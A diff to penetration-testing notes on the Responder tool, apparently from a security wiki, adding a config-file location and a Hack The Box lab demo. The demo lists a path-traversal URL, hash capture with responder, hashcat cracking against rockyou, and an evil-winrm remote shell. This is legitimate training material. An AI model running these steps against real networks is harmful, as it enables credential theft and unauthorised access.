@@ -133,6 +133,8 @@ Coupling with ntlmrelayx:
 #### Configuration and Usage
 
 Various Responder modules can be enabled/disabled in the configuration file, generally located in `/etc/responder/Responder.conf`.
+On Exegol, it is usually located in `/opt/tools/Responder/Responder.conf`.
+If you can not find it on your machine use the find command `sudo find / -name "Responder.conf" 2>/dev/null`.
 
 ```
 # Using -v with responder allows for continuous display of hashes
@@ -185,6 +187,16 @@ sudo responder -I <interface-name> -dvw
 - Educate users 
 
 ## Demo
+
+The demo is based on the Responder machine available on Hackthebox : https://app.hackthebox.com/starting-point 
+
+- Connect to the VPN, now we are on the same LAN as the target machine
+- Add `unika.htb` in the `/etc/hosts` since the server is a `name based virtual host`
+- Show the responder configuration file in `/opt/tools/Responder/Responder.conf`
+- Launch responder `responder -I tun0 -dvw`
+- Trigger a DNS error via an LFI in the target's website by searching for a share that does not exist (can show the existence of the lfi by visiting http://unika.htb/index?page=../../../../../../../../windows/system32/drivers/etc/hosts)
+- Receive the uer credentials, crack it with hashcat `hashcat -m 5600 -a 0 hash.txt /usr/share/wordlist/rockyou.txt`
+- Gain a shell with evil-winrm and its command: `evil-winrm -i <our-ip-address> -u <username> -p <password>`
 
 ## Sources and resources
 
